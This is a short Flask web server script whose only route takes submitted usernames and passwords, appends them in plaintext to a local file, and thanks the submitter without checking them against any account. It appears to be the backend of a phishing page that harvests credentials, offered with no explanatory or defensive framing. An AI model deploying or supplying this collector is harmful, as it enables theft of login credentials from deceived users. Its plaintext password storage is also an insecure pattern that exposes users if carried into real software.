from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def collect_data():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open('credentials.txt', 'a') as file:
            file.write(f"Username: {username}, Password: {password}\n")
        return "Thank you for your submission."
    return "Invalid request."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)